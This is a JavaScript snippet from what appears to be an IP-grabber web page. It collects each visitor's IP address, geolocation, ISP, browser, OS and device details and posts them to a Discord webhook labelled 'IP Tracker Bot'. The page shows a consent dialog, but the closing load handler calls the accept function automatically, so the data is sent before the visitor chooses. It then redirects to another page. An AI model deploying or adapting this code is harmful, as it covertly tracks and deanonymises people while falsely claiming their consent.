
        // Discord Webhook URL
        let consentGiven = false;
        function detectBrowser() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('chrome') && !userAgent.includes('edg')) return 'Chrome';
            if (userAgent.includes('firefox')) return 'Firefox';
            if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Safari';
            if (userAgent.includes('edg')) return 'Edge';
            if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
            return 'Unknown';
        }

        // Function to detect OS
        function detectOS() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('windows')) return 'Windows';
            if (userAgent.includes('mac')) return 'macOS';
            if (userAgent.includes('linux')) return 'Linux';
            if (userAgent.includes('android')) return 'Android';
            if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'iOS';
            return 'Unknown';
        }

        // Function to get additional info
        function getDeviceInfo() {
            return {
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Not set',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localTime: new Date().toLocaleString()
            };
        }

        // Function to send data to Discord
        async function sendToDiscord(ipData) {
            const now = new Date();
            const deviceInfo = getDeviceInfo();
            const browser = detectBrowser();
            const os = detectOS();

            // Create Discord embed with cleaner formatting
            const locationStr = ipData.city && ipData.city !== 'Unknown'
                ? `${ipData.city}, ${ipData.region}, ${ipData.country}`
                : 'Location unavailable';

            const ispStr = ipData.org && ipData.org !== 'Unknown' ? ipData.org : 'ISP unavailable';

            const embed = {
                title: "New Visitor (Consent Given)",
                color: 0x57F287,  // Green color to indicate consent was given
                fields: [
                    {
                        name: "IP Address",
                        value: `\`\`\`${ipData.ip}\`\`\``,
                        inline: false
                    },
                    {
                        name: "Timestamp",
                        value: `<t:${Math.floor(now.getTime() / 1000)}:F>`,
                        inline: false
                    },
                    {
                        name: "System",
                        value: `> **Browser:** ${browser}\n> **OS:** ${os}\n> **Language:** ${deviceInfo.language}\n> **Timezone:** ${deviceInfo.timezone}`,
                        inline: false
                    },
                    {
                        name: "Display",
                        value: `> **Screen:** ${deviceInfo.screenResolution}\n> **Viewport:** ${deviceInfo.viewport}`,
                        inline: false
                    },
                    {
                        name: "Network",
                        value: `> **Location:** ${locationStr}\n> **ISP:** ${ispStr}`,
                        inline: false
                    },
                    {
                        name: "User Agent",
                        value: `\`\`\`${navigator.userAgent.substring(0, 1000)}\`\`\``,
                        inline: false
                    }
                ]
            };

            // Prepare webhook payload
            const payload = {
                content: ipData.ip,
                embeds: [embed],
                username: "IP Tracker Bot"
            };

            try {
                // Send to Discord webhook
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Successfully sent to Discord');
                } else {
                    console.error('Failed to send to Discord:', response.status);
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Function to get visitor IP and info
        async function getVisitorInfo() {
            // Try multiple IP services in order - IPv4 specific endpoints
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/v1/ip',
                'https://ipv4.icanhazip.com',
                'https://api.ipify.org',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json'
            ];

            let ipData = null;
            let ipv4 = null;

            // Try each service until we get IPv4
            for (const service of ipServices) {
                try {
                    const response = await fetch(service, {
                        method: 'GET',
                        cache: 'no-cache'
                    });

                    let data;
                    const contentType = response.headers.get('content-type');

                    // Handle both JSON and plain text responses
                    if (contentType && contentType.includes('application/json')) {
                        data = await response.json();
                        ipv4 = data.ip || data.ip_addr || data.IPv4;
                    } else {
                        // Plain text response
                        ipv4 = (await response.text()).trim();
                    }

                    // Verify it's IPv4 (not IPv6)
                    if (ipv4 && !ipv4.includes(':') && ipv4.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
                        // Valid IPv4 format
                        ipData = {
                            ip: ipv4,
                            city: data?.city || 'Unknown',
                            region: data?.region || data?.region_name || 'Unknown',
                            country: data?.country || data?.country_name || data?.country_code || 'Unknown',
                            org: data?.org || data?.isp || data?.as || 'Unknown'
                        };

                        console.log('Successfully retrieved IPv4 from:', service);
                        break;
                    } else {
                        console.log(`Got IPv6 or invalid format from ${service}, trying next...`);
                        continue;
                    }
                } catch (error) {
                    console.log(`Service ${service} failed:`, error.message);
                    continue;
                }
            }

            // If all services failed, send without IP
            if (!ipData) {
                console.warn('All IP services blocked by browser tracking prevention');
                ipData = {
                    ip: 'Blocked by Tracking Prevention',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    org: 'Unknown'
                };
            }

            // Send to Discord
            await sendToDiscord(ipData);
        }

        // Accept consent
        function acceptConsent() {
            consentGiven = true;

            // Hide consent modal
            document.getElementById('consentOverlay').classList.add('hidden');

            // Show main content
            document.getElementById('mainContent').style.display = 'flex';

            // Collect and send data
            setTimeout(getVisitorInfo, 500);
        }
        // Show privacy details
        function showDetails() {
            document.getElementById('privacyDetails').classList.remove('hidden');
        }

        // Close privacy details
        function closeDetails() {
            document.getElementById('privacyDetails').classList.add('hidden');
        }


        // Decline consent
        function declineConsent() {
            // Hide consent modal
            document.getElementById('consentOverlay').classList.add('hidden');

            // Show declined message
            document.getElementById('declinedMessage').classList.remove('hidden');

            // Optional: Send notification that user declined
            sendDeclineNotification();
        }

        // Send notification that user declined
        async function sendDeclineNotification() {
            const payload = {
                content: '⚠️ User declined data collection terms',
                embeds: [{
                    title: "Consent Declined",
                    description: "A visitor declined the data collection consent.",
                    color: 0xED4245,  // Red color
                    timestamp: new Date().toISOString()
                }],
                username: "IP Tracker Bot"
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Error sending decline notification:', error);
            }
        }
document.addEventListener("DOMContentLoaded", () => {
    acceptConsent();
    ope();
    window.location.href = "1.html";
});